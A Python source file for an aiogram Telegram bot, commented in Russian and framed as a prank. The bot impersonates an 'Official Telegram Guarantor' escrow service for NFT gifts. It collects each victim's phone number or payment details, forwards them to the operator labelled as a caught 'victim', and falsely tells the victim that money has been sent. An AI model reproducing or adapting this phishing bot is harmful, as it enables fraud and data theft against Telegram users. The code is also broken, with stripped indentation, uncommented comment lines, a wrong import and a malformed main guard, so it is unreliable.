import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.fntypes import Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
API_TOKEN = 'ТВОЙ_ТОКЕН_БОТА_ОТ_BOTFATHER'
ADMIN_ID = ТВОЙ_TELEGRAM_ID  # Твой айди, чтобы только ты мог подтверждать сделку
bot = Bot(token=API_TOKEN)
dp = Dispatcher()
class PrankState(StatesGroup):
waiting_for_item = State()
waiting_for_phone = State()
Главное меню для друга
@dp.message(Command('start'))
async def cmd_start(message: Message, state: FSMContext):
keyboard = InlineKeyboardMarkup(
inline_keyboard=[
[
InlineKeyboardButton(
text='🎁 Создать сделку с NFT', callback_data='create_deal'
)
]
]
)
await message.answer(
'🤖 Добро пожаловать в Официальный Гарант Telegram!\n'
'Здесь можно безопасно передавать NFT-подарки.',
reply_markup=keyboard,
)
Начало сделки
@dp.callback_query(F.data == 'create_deal')
async def start_deal(callback: CallbackQuery, state: FSMContext):
await callback.message.answer(
'Введите название NFT-подарка, который хотите передать:'
)
await state.set_state(PrankState.waiting_for_item)
await callback.answer()
Получаем название подарка и просим «номер»
@dp.message(PrankState.waiting_for_item)
async def get_item(message: Message, state: FSMContext):
await state.update_data(item=message.text)
await message.answer(
'Отлично! Теперь укажите ваш номер телефона или реквизиты для получения'
' выплаты:'
)
await state.set_state(PrankState.waiting_for_phone)
Получаем реквизиты и отправляем тебе уведомление
@dp.message(PrankState.waiting_for_phone)
async def get_phone(message: Message, state: FSMContext):
data = await state.get_data()
item = data.get('item')
phone = message.text
user_name = message.from_user.full_name
Сообщаем другу, что сделка создана и ждет гаранта
await message.answer(
'⏳ Сделка зарегистрирована! Ожидаем подтверждения от Гаранта...'
)
Отправляем тебе (админу) пульт управления пранком
admin_keyboard = InlineKeyboardMarkup(
inline_keyboard=[
[
InlineKeyboardButton(
text='✅ Подтвердить перевод денег',
callback_data=f'approve_{message.from_user.id}',
)
]
]
)
await bot.send_message(
ADMIN_ID,
f'🚨 Новая ловушка сработала!\n\n'
f'Жертва: {user_name}\n'
f'Подарок: {item}\n'
f'Реквизиты: {phone}',
reply_markup=admin_keyboard,
)
await state.clear()
Ты нажимаешь кнопку подтверждения — друг получает победный вердикт
@dp.callback_query(F.data.startswith('approve_'))
async def approve_deal(callback: CallbackQuery):
target_user_id = int(callback.data.split('_')[1])
Отправляем другу сообщение о «завершении»
await bot.send_message(
target_user_id,
'🎉 ВНИМАНИЕ! СДЕЛКА УСПЕШНО СОВЕРШЕНА!\n\n'
'Деньги отправлены на ваш баланс. '
'\n\n',
)
await callback.message.edit_text(
'✅ Вы успешно подтвердили сделку и разыграли друга!'
)
await callback.answer()
async def main():
await dp.start_polling(bot)
if name == 'main':
asyncio.run(main())